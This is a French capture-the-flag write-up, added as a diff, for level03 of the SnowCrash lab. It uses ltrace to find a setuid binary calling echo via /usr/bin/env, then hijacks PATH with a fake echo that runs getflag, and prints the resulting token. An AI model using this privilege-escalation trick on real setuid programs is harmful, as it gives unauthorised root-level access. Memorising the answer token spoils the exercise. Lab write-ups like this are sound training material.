@@ -1,0 +1,42 @@
+Explications :
+
+On fait ls, on trouve un binaire `level03`
+
+On l'execute, ce qui donne `Exploit me`
+
+ls -lA donne cette ligne `-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03` on voit donc que l'executable a les permissions de flag03 (donc il peut executer getflag)
+
+ltrace ./level03 :
+
+level03@SnowCrash:~$ ltrace ./level03 
+__libc_start_main(0x80484a4, 1, 0xbffffd14, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                                                                                                           = 2003
+geteuid()                                                                                                                           = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                                 = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                                 = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                                              = 0
++++ exited (status 0) +++
+
+La ligne qui nous interesse est : system("/usr/bin/env echo Exploit me"Exploit me
+
+Etrange, il n'y a pas besoin d'aller chercher dans l'env echo etant donne que c'est un builtin.
+
+On a juste donc a coder un binaire qui execute getflag, a nommer ce binaire echo et a le mettre dans la variable d'environnement "PATH"
+
+Binaire : 
+
+int main() {
+  system("getflag");
+}
+
+On le compile et fait `mv a.out echo` pour que le binaire `level03` le trouve bien.
+
+On fait `export PATH="/tmp:/bin"` pour bien dire que notre binaire echo est dans /tmp et on met /bin pour qu'il trouve la commande getflag
+
+Resultat lors de l'execution du binaire level03 :
+
+level03@SnowCrash:~$ ./level03 
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
